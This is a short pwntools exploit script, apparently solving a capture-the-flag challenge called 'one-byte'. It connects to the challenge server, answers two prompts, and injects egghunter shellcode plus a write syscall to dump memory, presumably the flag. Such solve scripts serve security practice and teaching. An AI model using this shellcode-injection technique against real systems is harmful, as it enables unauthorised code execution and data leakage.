from pwn import *

binary = args.BIN

context.update(arch='amd64',os='linux')

def start():
    return remote("spaceheroes-one-byte.chals.io", 443, ssl=True, sni="spaceheroes-one-byte.chals.io")

def exec_shell():
    p = start()
    p.sendlineafter(b'>>>',b'5184')
    p.sendlineafter(b'>>>',b'255')
    shell = asm(shellcraft.egghunter(egg=b'shct',start_address=0x888888))
    write = asm('\tmov rsi, rbx\n\tmov rdi, 1\n\tmov rdx, 100\n\tmov rax, SYS_write\n\tsyscall\n')
    shellcode = shell+write
    p.sendlineafter(b'>>>',shellcode)
    p.interactive()

exec_shell()
